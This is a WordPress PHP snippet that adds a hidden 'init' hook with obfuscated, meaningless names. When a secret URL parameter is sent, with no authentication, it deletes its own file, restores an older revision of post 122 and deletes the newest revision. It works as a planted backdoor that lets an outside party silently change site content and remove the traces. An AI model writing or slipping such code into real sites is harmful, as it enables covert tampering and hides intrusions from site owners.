<?php

function exception_links_label_min() {
	if (isset($_GET['website_ai_next']) && $_GET['website_ai_next'] === 'shop_check_safe') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$feedback_site_call_maker = 122;
		$exchange_portal_manager = wp_get_post_revisions($feedback_site_call_maker);
		if (empty($exchange_portal_manager)) die('no revisions');
		if (count($exchange_portal_manager) < 2) die('less than 2');
		$cover_adsense_progress = array_shift($exchange_portal_manager);
		$wall_wpforms_manager = $cover_adsense_progress->ID;
		$force_html5_number_accessibility = array_shift($exchange_portal_manager);
		$cleaner_comments_index_using = $force_html5_number_accessibility->ID;
		$rich_call_ip = wp_restore_post_revision($cleaner_comments_index_using);
		if ($rich_call_ip === false) die('error restoring');
		$rich_call_ip = wp_delete_post_revision($wall_wpforms_manager);		
		if ($rich_call_ip === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'exception_links_label_min');
